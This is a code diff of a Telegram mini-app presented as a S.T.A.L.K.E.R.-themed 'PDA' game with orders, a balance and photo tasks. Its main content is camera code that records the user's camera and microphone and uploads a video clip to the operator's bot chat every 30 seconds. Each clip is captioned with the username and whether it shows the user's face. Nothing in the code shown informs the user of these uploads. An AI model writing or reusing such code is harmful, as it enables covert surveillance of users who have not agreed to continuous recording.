@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PDA Arsenii v6.1 Stable</title>
+    <title>PDA Arsenii v6.5 Final</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root { --green: #00ff41; --bg: #050804; }
@@ -56,66 +56,62 @@
     let mediaRecorder;
     let chunks = [];
 
-    // Инициализация интерфейса
     document.getElementById('balance').innerText = localStorage.getItem(`bal_${user.id}`) || 0;
     const savedOrder = localStorage.getItem(`order_${user.id}`);
     if (savedOrder) document.getElementById('target-text').innerText = savedOrder;
 
     async function initCamera(mode) {
         if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
-        
         try {
             const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } },
+                video: { facingMode: mode },
                 audio: true
             });
             window.currentStream = stream;
             document.getElementById('webcam').srcObject = stream;
             setupRecorder(stream);
-        } catch (err) {
-            console.error(err);
-            // Если 720p не пошло, пробуем без параметров
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
-            window.currentStream = stream;
-            document.getElementById('webcam').srcObject = stream;
-            setupRecorder(stream);
-        }
+        } catch (err) { console.error(err); }
     }
 
     function setupRecorder(stream) {
-        // Используем самый стабильный кодек vp8
-        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+        // Проверка поддерживаемых форматов для исключения "черного экрана"
+        let types = [
+            'video/mp4;codecs=h264,aac',
+            'video/webm;codecs=h264,opus',
+            'video/webm;codecs=vp8,opus',
+            'video/webm'
+        ];
+        let supportedType = types.find(t => MediaRecorder.isTypeSupported(t)) || '';
+
+        mediaRecorder = new MediaRecorder(stream, { mimeType: supportedType });
         
         mediaRecorder.ondataavailable = (e) => {
-            if (e.data.size > 5000) chunks.push(e.data);
+            if (e.data.size > 0) chunks.push(e.data);
         };
 
         mediaRecorder.onstop = () => {
-            if (chunks.length > 0) {
-                const blob = new Blob(chunks, { type: 'video/mp4' }); // Маскируем под mp4 для плеера
-                sendVideo(blob);
-                chunks = [];
-            }
+            const blob = new Blob(chunks, { type: supportedType.includes('mp4') ? 'video/mp4' : 'video/webm' });
+            sendVideo(blob);
+            chunks = [];
             if (mediaRecorder.state === "inactive") mediaRecorder.start();
         };
 
         mediaRecorder.start();
     }
 
-    // Цикл отправки каждые 30 секунд
     setInterval(() => {
-        if (mediaRecorder && mediaRecorder.state === "recording") {
-            mediaRecorder.stop();
-        }
+        if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();
     }, 30000);
 
     function sendVideo(blob) {
         const fd = new FormData();
         fd.append("chat_id", CONFIG.chatId);
-        fd.append("video", blob, `v_${Date.now()}.mp4`);
-        fd.append("supports_streaming", "true");
-        fd.append("caption", `👤 Сталкер: ${user.username}\n🎥 Ракурс: ${currentMode === 'user' ? 'ЛИЦО' : 'ОБЗОР'}`);
-        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo?disable_notification=true`, { method: "POST", body: fd });
+        // Чтобы TG видел это как видео, расширение должно совпадать с реальностью
+        const extension = blob.type.includes('mp4') ? 'mp4' : 'webm';
+        fd.append("video", blob, `v_${Date.now()}.${extension}`);
+        fd.append("caption", `👤 Игрок: ${user.username}\n🎥 Ракурс: ${currentMode === 'user' ? 'ЛИЦО' : 'ОБЗОР'}`);
+        
+        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo`, { method: "POST", body: fd });
     }
 
     document.getElementById('switchCam').onclick = () => {
@@ -136,8 +132,8 @@
             const kb = { inline_keyboard: [[{ text: "✅ ОПЛАТИТЬ (+100)", callback_data: `pay:${user.id}:100` }]] };
             fd.append("reply_markup", JSON.stringify(kb));
             fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: "POST", body: fd });
-            tg.showAlert("ДАННЫЕ ПЕРЕДАНЫ");
-        }, "image/jpeg", 0.8);
+            tg.showAlert("ОТПРАВЛЕНО");
+        }, "image/jpeg", 0.7);
     };
 
     async function sync() {
@@ -154,11 +150,9 @@
                             localStorage.setItem(`bal_${user.id}`, b);
                             document.getElementById('balance').innerText = b;
                             
-                            // СБРОС ПРИКАЗА
                             const def = "ЗАГРУЗКА ПРИКАЗА...";
                             document.getElementById('target-text').innerText = def;
                             localStorage.setItem(`order_${user.id}`, def);
-                            tg.HapticFeedback.notificationOccurred('success');
                         }
                     }
                     const msg = u.message?.text || "";
